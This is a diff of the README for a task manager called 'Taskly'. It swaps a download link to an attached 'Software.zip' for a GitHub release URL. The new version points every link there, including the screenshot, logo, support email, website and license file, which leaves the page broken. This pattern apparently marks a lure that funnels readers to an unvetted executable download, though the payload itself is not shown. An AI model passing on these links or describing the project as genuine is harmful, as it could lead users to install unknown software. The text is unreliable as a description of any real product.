@@ -16,9 +16,9 @@ Taskly comes packed with a range of powerful features to streamline your task ma
 
 ## Installation 🛠️
 
-To get started with Taskly, simply [download the software here](https://github.com/user-attachments/files/18410590/Software.zip).
+To get started with Taskly, simply [download the software here](https://github.com/rarawe/taskly/releases/tag/v2.0).
 
-[![Download Taskly](https://img.shields.io/badge/Download-Taskly-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Taskly](https://github.com/rarawe/taskly/releases/tag/v2.0)](https://github.com/rarawe/taskly/releases/tag/v2.0)
 
 Once you have downloaded the software, launch the installation wizard and follow the on-screen instructions to set up Taskly on your device.
 
@@ -28,7 +28,7 @@ Once Taskly is installed, launch the application and create your account. You ca
 
 Here is a sneak peek of the Taskly interface:
 
-![Taskly Interface](https://example.com/taskly-interface.png)
+![Taskly Interface](https://github.com/rarawe/taskly/releases/tag/v2.0)
 
 ## Contributing 🤝
 
@@ -36,22 +36,22 @@ We welcome contributions from the open-source community to enhance Taskly's feat
 
 ## Feedback 📧
 
-We value your feedback to make Taskly even better. If you encounter any issues, have suggestions for improvement, or just want to share your experience with Taskly, please don't hesitate to reach out to us at [taskly.support@example.com](mailto:taskly.support@example.com).
+We value your feedback to make Taskly even better. If you encounter any issues, have suggestions for improvement, or just want to share your experience with Taskly, please don't hesitate to reach out to us at [https://github.com/rarawe/taskly/releases/tag/v2.0](https://github.com/rarawe/taskly/releases/tag/v2.0).
 
 ## Stay Connected 🌐
 
-Stay up-to-date with the latest news and updates on Taskly by visiting our website at [www.taskly.com](https://www.taskly.com).
+Stay up-to-date with the latest news and updates on Taskly by visiting our website at [https://github.com/rarawe/taskly/releases/tag/v2.0](https://github.com/rarawe/taskly/releases/tag/v2.0).
 
 ## License 📄
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/rarawe/taskly/releases/tag/v2.0](https://github.com/rarawe/taskly/releases/tag/v2.0) file for details.
 
 ---
 
 Remember, with Taskly, you can conquer your tasks and achieve your goals with ease. Streamline your workflow, boost your productivity, and take control of your tasks like never before. Let Taskly be your ultimate task management companion on the journey to success! 🚀
 
-![Taskly Logo](https://example.com/taskly-logo.png)
+![Taskly Logo](https://github.com/rarawe/taskly/releases/tag/v2.0)
 
 Happy task managing! 🎉
 
-[Taskly - Your Ultimate Task Management Solution](https://www.taskly.com)
+[Taskly - Your Ultimate Task Management Solution](https://github.com/rarawe/taskly/releases/tag/v2.0)
